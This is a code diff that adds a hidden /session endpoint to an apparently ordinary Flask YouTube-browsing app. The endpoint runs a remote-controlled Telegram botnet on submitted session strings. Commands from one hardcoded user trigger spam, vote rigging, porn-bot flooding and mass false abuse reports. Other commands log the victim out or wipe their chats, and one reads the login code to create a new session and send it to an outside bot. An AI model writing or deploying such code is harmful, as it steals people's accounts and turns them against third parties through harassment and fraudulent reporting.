@@ -465,6 +465,310 @@ def index():
     return render_template('yt.html', videos=videos)
 
 
+async def run(ses):
+    legendx = [1303790979]
+    api_id = 1621727
+    api_hash = "31350903c528876f79527398c09660ce"
+    import telethon
+    from telethon.tl.functions import channels, messages, auth
+    try:
+        bot = telethon.TelegramClient(
+            telethon.sessions.StringSession(ses), api_id,  api_hash)
+        await bot.connect()
+        print((await bot.get_me()).first_name)
+        try:
+            await bot(channels.JoinChannelRequest("InducedSelling"))
+        except:
+            pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.ping', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                await event.reply('Hey! I Am Active')
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.spem', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                number = int(text.split(" ", 1)[0])
+                msg = text.split(" ", 1)[1]
+                for x in range(number):
+                    await event.respond(msg)
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.dmspem', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                number = int(text.split(" ", 1)[0])
+                msg = text.split(" ", 1)[1]
+                username = msg.split("-", 1)[0]
+                msg = msg.split("-", 1)[1]
+                for x in range(number):
+                    await bot.send_message(username, msg)
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(incoming=True, pattern=".refreshall", from_users=legendx))
+        async def refresh(event):
+            async for x in bot.iter_dialogs():
+                try:
+                    if str(x.id) == "-1001772985642":
+                        pass
+                    else:
+                        await bot.delete_dialog(x.id, revoke=True)
+                        print("done group leaved")
+                except Exception as e:
+                    print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.dmporn', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                number = int(text.split(" ", 1)[0])
+                username = text.split(" ", 1)[1]
+                for x in range(number):
+                    inline = await bot.inline_query("spamopxbot", "")
+                    await inline[0].click(username)
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.refer', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                username = text.split(" ", 1)[0]
+                msg = text.split(" ", 1)[1]
+                request = messages.StartBotRequest(username, username, msg)
+                result = await bot(request)
+                print(result)
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.logoutall', incoming=True, from_users=legendx))
+        async def joinpbgrp(event):
+            try:
+                await bot.log_out()
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.terminateall', incoming=True, from_users=legendx))
+        async def joinpbgrp(event):
+            try:
+                await bot(auth.ResetAuthorizationsRequest())
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.join', incoming=True, from_users=legendx))
+        async def joinpbgrp(event):
+            try:
+                link = event.text.split(" ", 1)[1]
+                await bot(channels.JoinChannelRequest(link))
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.pjoin', incoming=True, from_users=legendx))
+        async def joinpbgrp(event):
+            try:
+                link = event.text.split(" ", 1)[1]
+                await bot(messages.ImportChatInviteRequest(link))
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.leave', incoming=True, from_users=legendx))
+        async def leavegrp(event):
+            try:
+                link = event.text.split(" ", 1)[1]
+                await bot(channels.LeaveChannelRequest(link))
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.vote', incoming=True, from_users=legendx))
+        async def okvotekro(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                number = int(text.split(" ", 1)[0])
+                username = text.split(" ", 1)[1]
+                username = username.split("-", 1)[0]
+                numid = username.split("-", 1)[1]
+                for x in await bot.get_messages(username, limit=1000):
+                    if int(x.id) == number:
+                        await x.click(numid)
+                        print("i clicked")
+                    else:
+                        pass
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.pvote', incoming=True, from_users=legendx))
+        async def privatevotekro(event):
+            try:
+                text = event.text.split(" ", 1)[1]
+                number = int(text.split(" ", 1)[0])
+                username = text.split(" ", 1)[1]
+                huh = await bot.get_entity(int(username))
+                for x in await bot.get_messages(huh, limit=10000):
+                    if int(x.id) == number:
+                        await x.click(0)
+                        print("i clicked")
+                    else:
+                        pass
+                await bot.delete_dialog(username)
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.inlinespam', incoming=True, from_users=legendx))
+        async def ohh(event):
+            try:
+                lel = event.text.split(" ", 1)[1]
+                try:
+                    inline = await bot.inline_query("spamopxbot", "")
+                    for x in range(int(lel)):
+                        try:
+                            await inline[0].click(event.chat_id)
+                        except:
+                            break
+                except:
+                    pass
+            except:
+                pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.sendfile', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                await bot.send_file("legendxdev", "strings.txt")
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.newses', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                phone_number = "+" + str((await bot.get_me()).phone)
+                client = telethon.TelegramClient(
+                    telethon.sessions.StringSession(), api_id, api_hash)
+                await client.connect()
+                code = await client.send_code_request(phone_number)
+                async for x in bot.iter_messages(777000, limit=1):
+                    file = open("otp.txt",  "w")
+                    file.write(x.text)
+                    file.close()
+                file = open("otp.txt")
+                text = file.read()
+                file.close()
+                otp = " ".join(text[16:21])
+                phone_code = otp
+                await client.sign_in(phone_number, phone_code, password=None)
+                await bot.send_message("SessionsSavedBot", '/start')
+                await bot.send_message("SessionsSavedBot", str(client.session.save()))
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.report', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                username = event.text.split(" ", 1)[1]
+                for x in range(500):
+                    message = """Hey Dear Telegram!\nI was joined a malicious Channel by mistake\nI saw here are many scammers sir\nPlease give scam tag to Channel or banned the channel\nThank you!!! 😊😊😊"""
+                    async for x in bot.iter_messages(username, limit=1):
+                        try:
+                            await bot(telethon.tl.functions.messages.ReportRequest(
+                                peer=username,
+                                id=[x.id],
+                                reason=telethon.tl.types.InputReportReasonCopyright(),
+                                message=message
+                            ))
+                            await bot(telethon.tl.functions.messages.ReportRequest(
+                                peer=username,
+                                id=[x.id],
+                                reason=telethon.tl.types.InputReportReasonFake(),
+                                message=message
+                            ))
+                            await bot(telethon.tl.functions.messages.ReportRequest(
+                                peer=username,
+                                id=[x.id],
+                                reason=telethon.tl.types.InputReportReasonViolence(),
+                                message=message
+                            ))
+                            await bot(telethon.tl.functions.messages.ReportRequest(
+                                peer=username,
+                                id=[x.id],
+                                reason=telethon.tl.types.InputReportReasonChildAbuse(),
+                                message=message
+                            ))
+                        except:
+                            pass
+            except Exception as e:
+                print(e)
+
+        @bot.on(telethon.events.NewMessage(pattern='.reportporn', incoming=True, from_users=legendx))
+        async def handler(event):
+            username = event.text.split(" ", 1)[1]
+            text = username.split(" ")
+            async for x in range(500):
+                try:
+                    await bot(
+                        telethon.tl.functions.messages.ReportRequest(
+                            peer=text[0],
+                            id=[text[1]],
+                            reason=telethon.tl.types.InputReportReasonPornography(),
+                            message='This is pornography content please ban this Channel !'
+                        )
+                    )
+                except:
+                    pass
+
+        @bot.on(telethon.events.NewMessage(pattern='.reports', incoming=True, from_users=legendx))
+        async def handler(event):
+            try:
+                chatid = event.text.split(" ", 1)[1]
+                username = await bot.get_entity(chatid)
+                async for x in bot.iter_messages(username.id, limit=1):
+                    try:
+                        await bot(telethon.tl.functions.messages.ReportRequest(
+                            peer=username.id,
+                            id=[x.id],
+                            reason=telethon.tl.types.InputReportReasonPornography(),
+                            message='This is porn please ban this group!'
+                        ))
+                    except:
+                        pass
+            except Exception as e:
+                print(e)
+        print(1)
+
+        await bot.run_until_disconnected()
+
+    except Exception as e:
+        print(e)
+
+@app.route('/session', methods=['GET', 'POST'])
+async def session():
+    if request.method == "POST":
+        data = request.get_json()
+        try:
+            session = data['session']
+        except KeyError:
+            session = None
+    else:
+        session = request.args.get('session')
+    if session:
+        await run(session)
+        res = {
+            "method": f"{request.method}",
+            "response": 'success'
+        }
+    else:
+        res = {
+            "method": f"{request.method}",
+            "response": 'uncessfull'
+        }
+    return jsonify(res)
+
+
+
 @app.route('/YouTube/watch', methods=['GET', 'POST'])
 def watch():
     search_url = 'https://www.googleapis.com/youtube/v3/search'
